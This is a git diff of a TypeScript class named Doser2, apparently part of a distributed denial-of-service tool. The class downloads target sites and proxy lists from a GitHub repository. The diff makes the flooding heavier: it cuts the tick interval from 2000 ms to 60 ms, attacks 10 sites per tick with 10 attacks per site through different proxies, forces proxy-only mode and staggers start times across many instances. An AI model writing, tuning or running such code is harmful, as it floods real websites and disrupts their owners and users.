@@ -16,24 +16,24 @@ interface TargetsData {
 }
 
 export class Doser2 {
-  private onlyProxy: boolean
   private working: boolean
-  private sitesPerTickCount: number
   private eventSource: EventEmitter
 
   private loadedTargetsAndProxies: TargetsData | null = null;
   private targetsAndProxiesInterval?: NodeJS.Timer;
-
   private tickInterval?: NodeJS.Timer;
-  private tickingIntervalTime = 2000;
-  private attacksPerSite = 5;
+
+  // Attack settings
+  private onlyProxy = true;
+  private sitesPerTickCount = 10; // How many sites we attack each interval
+  private tickingIntervalTime = 60;
+  private attacksPerSite = 10; //Attacks per site from different proxies
+  private randomStartTimeInterval = 100; // Setting used when you create many instances, additional interval before start
 
   private requestsPromises: Array<any> = [];
 
-  constructor (onlyProxy: boolean, workersCount: number) {
-    this.onlyProxy = onlyProxy;
+  constructor () {
     this.working = false;
-    this.sitesPerTickCount = workersCount;
     this.eventSource = new EventEmitter();
 
     //Initialize data
@@ -62,7 +62,7 @@ export class Doser2 {
       console.log('Loading targets and proxies;')
       const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
       const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
-      // https://www.wikipedia.org/
+
       if (sitesResponse.status === 200 && proxyResponse.status === 200) {
         const sites: SiteData[] = sitesResponse.data as Array<SiteData>
         const proxies: ProxyData[] = proxyResponse.data as Array<ProxyData>
@@ -83,11 +83,13 @@ export class Doser2 {
 
   start () {
     this.working = true;
-    this.tickInterval = setInterval(() => {
-      this.tick()
-        .then(() => console.log('Tick done'))
-        .catch(e => console.error('Tick with error'));
-    }, this.tickingIntervalTime);
+    setTimeout(() => {
+      this.tickInterval = setInterval(() => {
+        this.tick()
+          .then(() => console.log('Tick done'))
+          .catch(e => console.error('Tick with error'));
+      }, this.tickingIntervalTime);
+    }, this.randomStartTimeInterval);
   }
 
   stop () {
